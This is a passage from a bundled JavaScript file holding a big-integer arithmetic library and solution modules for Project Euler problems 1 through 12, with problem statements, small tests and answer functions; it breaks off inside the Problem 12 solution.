require=(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);throw new Error("Cannot find module '"+o+"'")}var f=n[o]={exports:{}};t[o][0].call(f.exports,function(e){var n=t[o][1][e];return s(n?n:e)},f,f.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){
var bigInt = (function () {
    var base = 10000000, logBase = 7;
    var sign = {
        positive: false,
        negative: true
    };

    var normalize = function (first, second) {
        var a = first.value, b = second.value;
        var length = a.length > b.length ? a.length : b.length;
        for (var i = 0; i < length; i++) {
            a[i] = a[i] || 0;
            b[i] = b[i] || 0;
        }
        for (var i = length - 1; i >= 0; i--) {
            if (a[i] === 0 && b[i] === 0) {
                a.pop();
                b.pop();
            } else break;
        }
        if (!a.length) a = [0], b = [0];
        first.value = a;
        second.value = b;
    };

    var parse = function (text, first) {
        if (typeof text === "object") return text;
        text += "";
        var s = sign.positive, value = [];
        if (text[0] === "-") {
            s = sign.negative;
            text = text.slice(1);
        }
        var text = text.split("e");
        if (text.length > 2) throw new Error("Invalid integer");
        if (text[1]) {
            var exp = text[1];
            if (exp[0] === "+") exp = exp.slice(1);
            exp = parse(exp);
            if (exp.lesser(0)) throw new Error("Cannot include negative exponent part for integers");
            while (exp.notEquals(0)) {
                text[0] += "0";
                exp = exp.prev();
            }
        }
        text = text[0];
        if (text === "-0") text = "0";
        var isValid = /^([0-9][0-9]*)$/.test(text);
        if (!isValid) throw new Error("Invalid integer");
        while (text.length) {
            var divider = text.length > logBase ? text.length - logBase : 0;
            value.push(+text.slice(divider));
            text = text.slice(0, divider);
        }
        var val = bigInt(value, s);
        if (first) normalize(first, val);
        return val;
    };

    var goesInto = function (a, b) {
        var a = bigInt(a, sign.positive), b = bigInt(b, sign.positive);
        if (a.equals(0)) throw new Error("Cannot divide by 0");
        var n = 0;
        do {
            var inc = 1;
            var c = bigInt(a.value, sign.positive), t = c.times(10);
            while (t.lesser(b)) {
                c = t;
                inc *= 10;
                t = t.times(10);
            }
            while (c.lesserOrEquals(b)) {
                b = b.minus(c);
                n += inc;
            }
        } while (a.lesserOrEquals(b));

        return {
            remainder: b.value,
            result: n
        };
    };

    var bigInt = function (value, s) {
        var self = {
            value: value,
            sign: s
        };
        var o = {
            value: value,
            sign: s,
            negate: function (m) {
                var first = m || self;
                return bigInt(first.value, !first.sign);
            },
            abs: function (m) {
                var first = m || self;
                return bigInt(first.value, sign.positive);
            },
            add: function (n, m) {
                var s, first = self, second;
                if (m) (first = parse(n)) && (second = parse(m));
                else second = parse(n, first);
                s = first.sign;
                if (first.sign !== second.sign) {
                    first = bigInt(first.value, sign.positive);
                    second = bigInt(second.value, sign.positive);
                    return s === sign.positive ?
						o.subtract(first, second) :
						o.subtract(second, first);
                }
                normalize(first, second);
                var a = first.value, b = second.value;
                var result = [],
					carry = 0;
                for (var i = 0; i < a.length || carry > 0; i++) {
                    var sum = (a[i] || 0) + (b[i] || 0) + carry;
                    carry = sum >= base ? 1 : 0;
                    sum -= carry * base;
                    result.push(sum);
                }
                return bigInt(result, s);
            },
            plus: function (n, m) {
                return o.add(n, m);
            },
            subtract: function (n, m) {
                var first = self, second;
                if (m) (first = parse(n)) && (second = parse(m));
                else second = parse(n, first);
                if (first.sign !== second.sign) return o.add(first, o.negate(second));
                if (first.sign === sign.negative) return o.subtract(o.negate(second), o.negate(first));
                if (o.compare(first, second) === -1) return o.negate(o.subtract(second, first));
                var a = first.value, b = second.value;
                var result = [],
					borrow = 0;
                for (var i = 0; i < a.length; i++) {
                    var tmp = a[i] - borrow;
                    borrow = tmp < b[i] ? 1 : 0;
                    var minuend = (borrow * base) + tmp - b[i];
                    result.push(minuend);
                }
                return bigInt(result, sign.positive);
            },
            minus: function (n, m) {
                return o.subtract(n, m);
            },
            multiply: function (n, m) {
                var s, first = self, second;
                if (m) (first = parse(n)) && (second = parse(m));
                else second = parse(n, first);
                s = first.sign !== second.sign;
                var a = first.value, b = second.value;
                var resultSum = [];
                for (var i = 0; i < a.length; i++) {
                    resultSum[i] = [];
                    var j = i;
                    while (j--) {
                        resultSum[i].push(0);
                    }
                }
                var carry = 0;
                for (var i = 0; i < a.length; i++) {
                    var x = a[i];
                    for (var j = 0; j < b.length || carry > 0; j++) {
                        var y = b[j];
                        var product = y ? (x * y) + carry : carry;
                        carry = product > base ? Math.floor(product / base) : 0;
                        product -= carry * base;
                        resultSum[i].push(product);
                    }
                }
                var max = -1;
                for (var i = 0; i < resultSum.length; i++) {
                    var len = resultSum[i].length;
                    if (len > max) max = len;
                }
                var result = [], carry = 0;
                for (var i = 0; i < max || carry > 0; i++) {
                    var sum = carry;
                    for (var j = 0; j < resultSum.length; j++) {
                        sum += resultSum[j][i] || 0;
                    }
                    carry = sum > base ? Math.floor(sum / base) : 0;
                    sum -= carry * base;
                    result.push(sum);
                }
                return bigInt(result, s);
            },
            times: function (n, m) {
                return o.multiply(n, m);
            },
            divmod: function (n, m) {
                var s, first = self, second;
                if (m) (first = parse(n)) && (second = parse(m));
                else second = parse(n, first);
                s = first.sign !== second.sign;
                if (bigInt(first.value, first.sign).equals(0)) return {
                    quotient: bigInt([0], sign.positive),
                    remainder: bigInt([0], sign.positive)
                };
                if (second.equals(0)) throw new Error("Cannot divide by zero");
                var a = first.value, b = second.value;
                var result = [], remainder = [];
                for (var i = a.length - 1; i >= 0; i--) {
                    var n = [a[i]].concat(remainder);
                    var quotient = goesInto(b, n);
                    result.push(quotient.result);
                    remainder = quotient.remainder;
                }
                result.reverse();
                return {
                    quotient: bigInt(result, s),
                    remainder: bigInt(remainder, first.sign)
                };
            },
            divide: function (n, m) {
                return o.divmod(n, m).quotient;
            },
            over: function (n, m) {
                return o.divide(n, m);
            },
            mod: function (n, m) {
                return o.divmod(n, m).remainder;
            },
            remainder: function(n, m) {
                return o.mod(n, m);
            },
            pow: function (n, m) {
                var first = self, second;
                if (m) (first = parse(n)) && (second = parse(m));
                else second = parse(n, first);
                var a = first, b = second;
                if (bigInt(a.value, a.sign).equals(0)) return ZERO;
                if (b.lesser(0)) return ZERO;
                if (b.equals(0)) return ONE;
                var result = bigInt(a.value, a.sign);

                if (b.mod(2).equals(0)) {
                    var c = result.pow(b.over(2));
                    return c.times(c);
                } else {
                    return result.times(result.pow(b.minus(1)));
                }
            },
            next: function (m) {
                var first = m || self;
                return o.add(first, 1);
            },
            prev: function (m) {
                var first = m || self;
                return o.subtract(first, 1);
            },
            compare: function (n, m) {
                var first = self, second;
                if (m) (first = parse(n)) && (second = parse(m, first));
                else second = parse(n, first);
                normalize(first, second);
                if (first.value.length === 1 && second.value.length === 1 && first.value[0] === 0 && second.value[0] === 0) return 0;
                if (second.sign !== first.sign) return first.sign === sign.positive ? 1 : -1;
                var multiplier = first.sign === sign.positive ? 1 : -1;
                var a = first.value, b = second.value;
                for (var i = a.length - 1; i >= 0; i--) {
                    if (a[i] > b[i]) return 1 * multiplier;
                    if (b[i] > a[i]) return -1 * multiplier;
                }
                return 0;
            },
            compareTo: function(n, m) {
                return o.compare(n, m);
            },
            compareAbs: function (n, m) {
                var first = self, second;
                if (m) (first = parse(n)) && (second = parse(m, first));
                else second = parse(n, first);
                first.sign = second.sign = sign.positive;
                return o.compare(first, second);
            },
            equals: function (n, m) {
                return o.compare(n, m) === 0;
            },
            notEquals: function (n, m) {
                return !o.equals(n, m);
            },
            lesser: function (n, m) {
                return o.compare(n, m) < 0;
            },
            greater: function (n, m) {
                return o.compare(n, m) > 0;
            },
            greaterOrEquals: function (n, m) {
                return o.compare(n, m) >= 0;
            },
            lesserOrEquals: function (n, m) {
                return o.compare(n, m) <= 0;
            },
            isPositive: function (m) {
                var first = m || self;
                return first.sign === sign.positive;
            },
            isNegative: function (m) {
                var first = m || self;
                return first.sign === sign.negative;
            },
            isEven: function (m) {
                var first = m || self;
                return first.value[0] % 2 === 0;
            },
            isOdd: function (m) {
                var first = m || self;
                return first.value[0] % 2 === 1;
            },
            toString: function (m) {
                var first = m || self;
                var str = "", len = first.value.length;
                while (len--) {
                    if (first.value[len].toString().length === 8) str += first.value[len];
                    else str += (base.toString() + first.value[len]).slice(-logBase);
                }
                while (str[0] === "0") {
                    str = str.slice(1);
                }
                if (!str.length) str = "0";
                if (str === "0") return str;
                var s = first.sign === sign.positive ? "" : "-";
                return s + str;
            },
            toJSNumber: function (m) {
                return +o.toString(m);
            },
            valueOf: function (m) {
                return o.toJSNumber(m);
            }
        };
        return o;
    };

    var ZERO = bigInt([0], sign.positive);
    var ONE = bigInt([1], sign.positive);
    var MINUS_ONE = bigInt([1], sign.negative);

    var parseBase = function (text, base) {
        base = parse(base);
        var val = ZERO;
        var digits = [];
        var i;
        var isNegative = false;
        function parseToken(text) {
            var c = text[i].toLowerCase();
            if (i === 0 && text[i] === "-") {
                isNegative = true;
                return;
            }
            if (/[0-9]/.test(c)) digits.push(parse(c));
            else if (/[a-z]/.test(c)) digits.push(parse(c.charCodeAt(0) - 87));
            else if (c === "<") {
                var start = i;
                do i++; while (text[i] !== ">");
                digits.push(parse(text.slice(start + 1, i)));
            }
            else throw new Error(c + " is not a valid character");
        }
        for (i = 0; i < text.length; i++) {
            parseToken(text);
        }
        digits.reverse();
        for (i = 0; i < digits.length; i++) {
            val = val.add(digits[i].times(base.pow(i)));
        }
        return isNegative ? -val : val;
    }

    var fnReturn = function (a, b) {
        if (typeof a === "undefined") return ZERO;
        if (typeof b !== "undefined") return parseBase(a, b);
        return parse(a);
    };
    fnReturn.zero = ZERO;
    fnReturn.one = ONE;
    fnReturn.minusOne = MINUS_ONE;
    return fnReturn;
})();

if (typeof module !== "undefined") {
    module.exports = bigInt;
}
},{}],"6xS60W":[function(require,module,exports){
var problem;

module.exports = problem = new Problem("\nProblem 1: Multiples of 3 and 5\n-------------------------------\n\nIf we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6 and 9.\nThe sum of these multiples is 23.\n\nFind the sum of all the multiples of 3 or 5 below 1000.\n");

problem.test = function() {
  var i, sum, _i;
  sum = 0;
  for (i = _i = 1; _i < 10; i = ++_i) {
    if ((i % 3 === 0) || (i % 5 === 0)) {
      sum += i;
    }
  }
  return equal(sum, 23, "Sum of natural numbers < 10: " + sum);
};

problem.answer = function() {
  var i, sum, _i;
  sum = 0;
  for (i = _i = 1; _i < 1000; i = ++_i) {
    if ((i % 3 === 0) || (i % 5 === 0)) {
      sum += i;
    }
  }
  return sum;
};


},{}],"e001":[function(require,module,exports){
module.exports=require('6xS60W');
},{}],"e002":[function(require,module,exports){
module.exports=require('45rRMW');
},{}],"45rRMW":[function(require,module,exports){
var problem;

module.exports = problem = new Problem("\nProblem 2: Even Fibonacci numbers\n---------------------------------\n\nEach new term in the Fibonacci sequence is generated by adding the previous two terms.\nBy starting with 1 and 2, the first 10 terms will be:\n\n1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...\n\nBy considering the terms in the Fibonacci sequence whose values do not exceed four million,\nfind the sum of the even-valued terms.\n");

problem.answer = function() {
  var curr, next, prev, sum;
  prev = 1;
  curr = 1;
  sum = 0;
  while (curr < 4000000) {
    if ((curr % 2) === 0) {
      sum += curr;
    }
    next = curr + prev;
    prev = curr;
    curr = next;
  }
  return sum;
};


},{}],"e003":[function(require,module,exports){
module.exports=require('kxgPTQ');
},{}],"kxgPTQ":[function(require,module,exports){
var isPrime, largestPrimeFactor, leastFactor, primeFactors, problem;

module.exports = problem = new Problem("\nProblem 3: Largest prime factor\n-------------------------------\n\nThe prime factors of 13195 are 5, 7, 13 and 29.\n\nWhat is the largest prime factor of the number 600851475143 ?\n");

leastFactor = function(n) {
  var i, m, _i;
  if (isNaN(n) || !isFinite(n)) {
    return NaN;
  }
  if (n === 0) {
    return 0;
  }
  if ((n % 1) !== 0 || (n * n) < 2) {
    return 1;
  }
  if ((n % 2) === 0) {
    return 2;
  }
  if ((n % 3) === 0) {
    return 3;
  }
  if ((n % 5) === 0) {
    return 5;
  }
  m = Math.sqrt(n);
  for (i = _i = 7; _i <= m; i = _i += 30) {
    if ((n % i) === 0) {
      return i;
    }
    if ((n % (i + 4)) === 0) {
      return i + 4;
    }
    if ((n % (i + 6)) === 0) {
      return i + 6;
    }
    if ((n % (i + 10)) === 0) {
      return i + 10;
    }
    if ((n % (i + 12)) === 0) {
      return i + 12;
    }
    if ((n % (i + 16)) === 0) {
      return i + 16;
    }
    if ((n % (i + 22)) === 0) {
      return i + 22;
    }
    if ((n % (i + 24)) === 0) {
      return i + 24;
    }
  }
  return n;
};

isPrime = function(n) {
  if (isNaN(n) || !isFinite(n) || (n % 1) !== 0 || (n < 2)) {
    return false;
  }
  if (n === leastFactor(n)) {
    return true;
  }
  return false;
};

primeFactors = function(n) {
  var factor, factors;
  if (n === 1) {
    return [1];
  }
  factors = [];
  while (!isPrime(n)) {
    factor = leastFactor(n);
    factors.push(factor);
    n /= factor;
  }
  factors.push(n);
  return factors;
};

largestPrimeFactor = function(n) {
  var factor;
  if (n === 1) {
    return 1;
  }
  while (!isPrime(n)) {
    factor = leastFactor(n);
    n /= factor;
  }
  return n;
};

problem.answer = function() {
  return largestPrimeFactor(600851475143);
};


},{}],"e004":[function(require,module,exports){
module.exports=require('IqK6Ix');
},{}],"IqK6Ix":[function(require,module,exports){
var isPalindrome, problem;

module.exports = problem = new Problem("\nProblem 4: Largest palindrome product\n-------------------------------------\n\nA palindromic number reads the same both ways.\n\nFind the largest palindrome made from the product of two 3-digit numbers.\n");

isPalindrome = function(n) {
  var i, str, _i, _ref;
  str = n.toString();
  for (i = _i = 0, _ref = str.length / 2; 0 <= _ref ? _i < _ref : _i > _ref; i = 0 <= _ref ? ++_i : --_i) {
    if (str[i] !== str[str.length - 1 - i]) {
      return false;
    }
  }
  return true;
};

problem.test = function() {
  var v, _i, _j, _len, _len1, _ref, _ref1, _results;
  _ref = [1, 11, 121, 1221, 12321, 1234321];
  for (_i = 0, _len = _ref.length; _i < _len; _i++) {
    v = _ref[_i];
    equal(isPalindrome(v), true, "isPalindrome(" + v + ") returns true");
  }
  _ref1 = [12, 123, 1234, 12345, 123456, 12324];
  _results = [];
  for (_j = 0, _len1 = _ref1.length; _j < _len1; _j++) {
    v = _ref1[_j];
    _results.push(equal(isPalindrome(v), false, "isPalindrome(" + v + ") returns false"));
  }
  return _results;
};

problem.answer = function() {
  var i, j, largesti, largestj, largestp, product, _i, _j;
  largesti = 0;
  largestj = 0;
  largestp = 0;
  for (i = _i = 100; _i <= 999; i = ++_i) {
    for (j = _j = 100; _j <= 999; j = ++_j) {
      product = i * j;
      if (isPalindrome(product)) {
        largesti = i;
        largestj = j;
        largestp = product;
      }
    }
  }
  return largestp;
};


},{}],"xGIOJC":[function(require,module,exports){
var problem;

module.exports = problem = new Problem("\nProblem 5: Smallest multiple\n----------------------------\n\n2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.\n\nWhat is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20?\n");

problem.answer = function() {
  var found, i, n, _i;
  n = 0;
  while (true) {
    n += 20;
    found = true;
    for (i = _i = 1; _i <= 20; i = ++_i) {
      if ((n % i) !== 0) {
        found = false;
        break;
      }
    }
    if (found) {
      break;
    }
  }
  return n;
};


},{}],"e005":[function(require,module,exports){
module.exports=require('xGIOJC');
},{}],"e006":[function(require,module,exports){
module.exports=require('SrRReL');
},{}],"SrRReL":[function(require,module,exports){
var differenceSumSquares, problem, squareOfSum, sumOfSquares;

module.exports = problem = new Problem("\nProblem 6: Sum square difference\n--------------------------------\n\nThe sum of the squares of the first ten natural numbers is,\n\n             1^2 + 2^2 + ... + 10^2 = 385\n\nThe square of the sum of the first ten natural numbers is,\n\n          (1 + 2 + ... + 10)^2 = 55^2 = 3025\n\nHence the difference between the sum of the squares of the first ten natural numbers and the square of the sum is 3025 − 385 = 2640.\n\nFind the difference between the sum of the squares of the first one hundred natural numbers and the square of the sum.\n");

sumOfSquares = function(n) {
  var i, sum, _i;
  sum = 0;
  for (i = _i = 1; 1 <= n ? _i <= n : _i >= n; i = 1 <= n ? ++_i : --_i) {
    sum += i * i;
  }
  return sum;
};

squareOfSum = function(n) {
  var i, sum, _i;
  sum = 0;
  for (i = _i = 1; 1 <= n ? _i <= n : _i >= n; i = 1 <= n ? ++_i : --_i) {
    sum += i;
  }
  return sum * sum;
};

differenceSumSquares = function(n) {
  return squareOfSum(n) - sumOfSquares(n);
};

problem.test = function() {
  equal(sumOfSquares(10), 385, "Sum of squares of first ten natural numbers is 385");
  equal(squareOfSum(10), 3025, "Square of sum of first ten natural numbers is 3025");
  return equal(differenceSumSquares(10), 2640, "Difference in values for the first ten natural numbers is 2640");
};

problem.answer = function() {
  return differenceSumSquares(100);
};


},{}],"e007":[function(require,module,exports){
module.exports=require('dV0xLp');
},{}],"dV0xLp":[function(require,module,exports){
var math, nthPrime, problem;

module.exports = problem = new Problem("\nProblem 7: 10001st prime\n------------------------\n\nBy listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see that the 6th prime is 13.\n\nWhat is the 10,001st prime number?\n");

math = require("math");

nthPrime = function(n) {
  var i, sieve, _i;
  sieve = new math.IncrementalSieve;
  for (i = _i = 1; 1 <= n ? _i < n : _i > n; i = 1 <= n ? ++_i : --_i) {
    sieve.next();
  }
  return sieve.next();
};

problem.test = function() {
  return equal(nthPrime(6), 13, "6th prime is 13");
};

problem.answer = function() {
  return nthPrime(10001);
};


},{"math":"Gm6Ven"}],"e008":[function(require,module,exports){
module.exports=require('TAaHWp');
},{}],"TAaHWp":[function(require,module,exports){
var digit, digits, largestProduct, problem, str;

module.exports = problem = new Problem("\nProblem 8: Largest product in a series\n--------------------------------------\n\nThe four adjacent digits in the 1000-digit number that have the greatest product are 9 x 9 x 8 x 9 = 5832.\n\n  73167176531330624919225119674426574742355349194934\n  96983520312774506326239578318016984801869478851843\n  85861560789112949495459501737958331952853208805511\n  12540698747158523863050715693290963295227443043557\n  66896648950445244523161731856403098711121722383113\n  62229893423380308135336276614282806444486645238749\n  30358907296290491560440772390713810515859307960866\n  70172427121883998797908792274921901699720888093776\n  65727333001053367881220235421809751254540594752243\n  52584907711670556013604839586446706324415722155397\n  53697817977846174064955149290862569321978468622482\n  83972241375657056057490261407972968652414535100474\n  82166370484403199890008895243450658541227588666881\n  16427171479924442928230863465674813919123162824586\n  17866458359124566529476545682848912883142607690042\n  24219022671055626321111109370544217506941658960408\n  07198403850962455444362981230987879927244284909188\n  84580156166097919133875499200524063689912560717606\n  05886116467109405077541002256983155200055935729725\n  71636269561882670428252483600823257530420752963450\n\nFind the thirteen adjacent digits in the 1000-digit number that have the greatest product. What is the value of this product?\n");

str = "73167176531330624919225119674426574742355349194934\n96983520312774506326239578318016984801869478851843\n85861560789112949495459501737958331952853208805511\n12540698747158523863050715693290963295227443043557\n66896648950445244523161731856403098711121722383113\n62229893423380308135336276614282806444486645238749\n30358907296290491560440772390713810515859307960866\n70172427121883998797908792274921901699720888093776\n65727333001053367881220235421809751254540594752243\n52584907711670556013604839586446706324415722155397\n53697817977846174064955149290862569321978468622482\n83972241375657056057490261407972968652414535100474\n82166370484403199890008895243450658541227588666881\n16427171479924442928230863465674813919123162824586\n17866458359124566529476545682848912883142607690042\n24219022671055626321111109370544217506941658960408\n07198403850962455444362981230987879927244284909188\n84580156166097919133875499200524063689912560717606\n05886116467109405077541002256983155200055935729725\n71636269561882670428252483600823257530420752963450";

str = str.replace(/[^0-9]/gm, "");

digits = (function() {
  var _i, _len, _results;
  _results = [];
  for (_i = 0, _len = str.length; _i < _len; _i++) {
    digit = str[_i];
    _results.push(parseInt(digit));
  }
  return _results;
})();

largestProduct = function(digitCount) {
  var end, i, largest, product, start, _i, _j, _ref;
  if (digitCount > digits.length) {
    return 0;
  }
  largest = 0;
  for (start = _i = 0, _ref = digits.length - digitCount; 0 <= _ref ? _i <= _ref : _i >= _ref; start = 0 <= _ref ? ++_i : --_i) {
    end = start + digitCount;
    product = 1;
    for (i = _j = start; start <= end ? _j < end : _j > end; i = start <= end ? ++_j : --_j) {
      product *= digits[i];
    }
    if (largest < product) {
      largest = product;
    }
  }
  return largest;
};

problem.test = function() {
  equal(largestProduct(4), 5832, "Greatest product of 4 adjacent digits is 5832");
  return equal(largestProduct(5), 40824, "Greatest product of 5 adjacent digits is 40824");
};

problem.answer = function() {
  return largestProduct(13);
};


},{}],"e009":[function(require,module,exports){
module.exports=require('9QexXm');
},{}],"9QexXm":[function(require,module,exports){
var findFirstTriplet, isTriplet, problem;

module.exports = problem = new Problem("\nProblem 9: Special Pythagorean triplet\n--------------------------------------\n\nA Pythagorean triplet is a set of three natural numbers, a < b < c, for which,\n\n    a^2 + b^2 = c^2\n\nFor example, 3^2 + 4^2 = 9 + 16 = 25 = 5^2.\n\nThere exists exactly one Pythagorean triplet for which a + b + c = 1000.\n\nFind the product abc.\n");

isTriplet = function(a, b, c) {
  return ((a * a) + (b * b)) === (c * c);
};

findFirstTriplet = function(sum) {
  var a, b, c, _i, _j;
  for (a = _i = 1; _i < 1000; a = ++_i) {
    for (b = _j = 1; _j < 1000; b = ++_j) {
      c = 1000 - a - b;
      if (isTriplet(a, b, c)) {
        return [a, b, c];
      }
    }
  }
  return false;
};

problem.test = function() {
  return equal(isTriplet(3, 4, 5), true, "(3,4,5) is a Pythagorean triplet");
};

problem.answer = function() {
  return findFirstTriplet(1000);
};


},{}],"0GIZG3":[function(require,module,exports){
var math, primeSum, problem;

module.exports = problem = new Problem("\nProblem 10: Summation of primes\n-------------------------------\n\nThe sum of the primes below 10 is 2 + 3 + 5 + 7 = 17.\n\nFind the sum of all the primes below two million.\n");

math = require("math");

primeSum = function(ceiling) {
  var n, sieve, sum;
  sieve = new math.IncrementalSieve;
  sum = 0;
  while (true) {
    n = sieve.next();
    if (n >= ceiling) {
      break;
    }
    sum += n;
  }
  return sum;
};

problem.test = function() {
  return equal(primeSum(10), 17, "Sum of primes below 10 is 17");
};

problem.answer = function() {
  return primeSum(2000000);
};


},{"math":"Gm6Ven"}],"e010":[function(require,module,exports){
module.exports=require('0GIZG3');
},{}],"e011":[function(require,module,exports){
module.exports=require('WITvtv');
},{}],"WITvtv":[function(require,module,exports){
var getLine, getLineProduct, grid, prepareGrid, problem;

module.exports = problem = new Problem("\nProblem 11: Largest product in a grid\n-------------------------------------\n\nIn the 20x20 grid below, four numbers along a diagonal line have been marked in red.\n\n          08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08\n          49 49 99 40 17 81 18 57 60 87 17 40 98 43 69 48 04 56 62 00\n          81 49 31 73 55 79 14 29 93 71 40 67 53 88 30 03 49 13 36 65\n          52 70 95 23 04 60 11 42 69 24 68 56 01 32 56 71 37 02 36 91\n          22 31 16 71 51 67 63 89 41 92 36 54 22 40 40 28 66 33 13 80\n          24 47 32 60 99 03 45 02 44 75 33 53 78 36 84 20 35 17 12 50\n          32 98 81 28 64 23 67 10 26_38 40 67 59 54 70 66 18 38 64 70\n          67 26 20 68 02 62 12 20 95 63_94 39 63 08 40 91 66 49 94 21\n          24 55 58 05 66 73 99 26 97 17 78_78 96 83 14 88 34 89 63 72\n          21 36 23 09 75 00 76 44 20 45 35 14 00 61 33 97 34 31 33 95\n          78 17 53 28 22 75 31 67 15 94 03 80 04 62 16 14 09 53 56 92\n          16 39 05 42 96 35 31 47 55 58 88 24 00 17 54 24 36 29 85 57\n          86 56 00 48 35 71 89 07 05 44 44 37 44 60 21 58 51 54 17 58\n          19 80 81 68 05 94 47 69 28 73 92 13 86 52 17 77 04 89 55 40\n          04 52 08 83 97 35 99 16 07 97 57 32 16 26 26 79 33 27 98 66\n          88 36 68 87 57 62 20 72 03 46 33 67 46 55 12 32 63 93 53 69\n          04 42 16 73 38 25 39 11 24 94 72 18 08 46 29 32 40 62 76 36\n          20 69 36 41 72 30 23 88 34 62 99 69 82 67 59 85 74 04 36 16\n          20 73 35 29 78 31 90 01 74 31 49 71 48 86 81 16 23 57 05 54\n          01 70 54 71 83 51 54 69 16 92 33 48 61 43 52 01 89 19 67 48\n\nThe product of these numbers is 26 x 63 x 78 x 14 = 1788696.\n\nWhat is the greatest product of four adjacent numbers in the same direction (up, down, left, right, or diagonally) in the 20x20 grid?\n");

grid = null;

prepareGrid = function() {
  var digit, digits, i, index, j, rawDigits, _i, _j, _results;
  rawDigits = "08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08\n49 49 99 40 17 81 18 57 60 87 17 40 98 43 69 48 04 56 62 00\n81 49 31 73 55 79 14 29 93 71 40 67 53 88 30 03 49 13 36 65\n52 70 95 23 04 60 11 42 69 24 68 56 01 32 56 71 37 02 36 91\n22 31 16 71 51 67 63 89 41 92 36 54 22 40 40 28 66 33 13 80\n24 47 32 60 99 03 45 02 44 75 33 53 78 36 84 20 35 17 12 50\n32 98 81 28 64 23 67 10 26 38 40 67 59 54 70 66 18 38 64 70\n67 26 20 68 02 62 12 20 95 63 94 39 63 08 40 91 66 49 94 21\n24 55 58 05 66 73 99 26 97 17 78 78 96 83 14 88 34 89 63 72\n21 36 23 09 75 00 76 44 20 45 35 14 00 61 33 97 34 31 33 95\n78 17 53 28 22 75 31 67 15 94 03 80 04 62 16 14 09 53 56 92\n16 39 05 42 96 35 31 47 55 58 88 24 00 17 54 24 36 29 85 57\n86 56 00 48 35 71 89 07 05 44 44 37 44 60 21 58 51 54 17 58\n19 80 81 68 05 94 47 69 28 73 92 13 86 52 17 77 04 89 55 40\n04 52 08 83 97 35 99 16 07 97 57 32 16 26 26 79 33 27 98 66\n88 36 68 87 57 62 20 72 03 46 33 67 46 55 12 32 63 93 53 69\n04 42 16 73 38 25 39 11 24 94 72 18 08 46 29 32 40 62 76 36\n20 69 36 41 72 30 23 88 34 62 99 69 82 67 59 85 74 04 36 16\n20 73 35 29 78 31 90 01 74 31 49 71 48 86 81 16 23 57 05 54\n01 70 54 71 83 51 54 69 16 92 33 48 61 43 52 01 89 19 67 48".replace(/[^0-9 ]/gm, " ");
  digits = (function() {
    var _i, _len, _ref, _results;
    _ref = rawDigits.split(" ");
    _results = [];
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      digit = _ref[_i];
      _results.push(parseInt(digit));
    }
    return _results;
  })();
  grid = Array(20);
  for (i = _i = 0; _i < 20; i = ++_i) {
    grid[i] = Array(20);
  }
  index = 0;
  _results = [];
  for (j = _j = 0; _j < 20; j = ++_j) {
    _results.push((function() {
      var _k, _results1;
      _results1 = [];
      for (i = _k = 0; _k < 20; i = ++_k) {
        grid[i][j] = digits[index];
        _results1.push(index++);
      }
      return _results1;
    })());
  }
  return _results;
};

prepareGrid();

getLineProduct = function(sx, sy, dx, dy) {
  var ex, ey, i, product, x, y, _i;
  ex = sx + (4 * dx);
  if ((ex < 0) || (ex >= 20)) {
    return -1;
  }
  ey = sy + (4 * dy);
  if ((ey < 0) || (ey >= 20)) {
    return -1;
  }
  x = sx;
  y = sy;
  product = 1;
  for (i = _i = 0; _i < 4; i = ++_i) {
    product *= grid[x][y];
    x += dx;
    y += dy;
  }
  return product;
};

getLine = function(sx, sy, dx, dy) {
  var ex, ey, i, line, x, y, _i;
  ex = sx + (4 * dx);
  if ((ex < 0) || (ex >= 20)) {
    return [];
  }
  ey = sy + (4 * dy);
  if ((ey < 0) || (ey >= 20)) {
    return [];
  }
  line = [];
  x = sx;
  y = sy;
  for (i = _i = 0; _i < 4; i = ++_i) {
    line.push(grid[x][y]);
    x += dx;
    y += dy;
  }
  return line;
};

problem.test = function() {
  return equal(getLineProduct(8, 6, 1, 1), 1788696, "Diagonal value shown in example equals 1,788,696");
};

problem.answer = function() {
  var i, j, max, p, _i, _j;
  max = {
    product: 1,
    i: 0,
    j: 0,
    dir: "right"
  };
  for (j = _i = 0; _i < 20; j = ++_i) {
    for (i = _j = 0; _j < 20; i = ++_j) {
      p = getLineProduct(i, j, 1, 0);
      if (max.product < p) {
        max.product = p;
        max.i = i;
        max.j = j;
        max.dir = "right";
      }
      p = getLineProduct(i, j, 0, 1);
      if (max.product < p) {
        max.product = p;
        max.i = i;
        max.j = j;
        max.dir = "down";
      }
      p = getLineProduct(i, j, 1, 1);
      if (max.product < p) {
        max.product = p;
        max.i = i;
        max.j = j;
        max.dir = "diagonalR";
      }
      p = getLineProduct(i, j, -1, 1);
      if (max.product < p) {
        max.product = p;
        max.i = i;
        max.j = j;
        max.dir = "diagonalL";
      }
    }
  }
  return max;
};


},{}],"OaGJp8":[function(require,module,exports){
var divisorCount, math, problem;

module.exports = problem = new Problem("\nProblem 12: Highly divisible triangular number\n----------------------------------------------\n\nThe sequence of triangle numbers is generated by adding the natural numbers. So the 7th triangle number would be\n\n                      1 + 2 + 3 + 4 + 5 + 6 + 7 = 28.\n\nThe first ten terms would be:\n\n                      1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ...\n\nLet us list the factors of the first seven triangle numbers:\n\n 1: 1\n 3: 1,3\n 6: 1,2,3,6\n10: 1,2,5,10\n15: 1,3,5,15\n21: 1,3,7,21\n28: 1,2,4,7,14,28\n\nWe can see that 28 is the first triangle number to have over five divisors.\n\nWhat is the value of the first triangle number to have over five hundred divisors?\n");

math = require("math");

divisorCount = function(n) {
  var count, exponent, factor, factors, lastFactor, _i, _len;
  if (n === 1) {
    return 1;
  }
  factors = math.primeFactors(n);
  count = 1;
  lastFactor = 0;
  exponent = 1;
  for (_i = 0, _len = factors.length; _i < _len; _i++) {
    factor = factors[_i];
    if (factor === lastFactor) {
      exponent++;
    } else {
      if (lastFactor !== 0) {
        count *= exponent + 1;
      }
      lastFactor = factor;
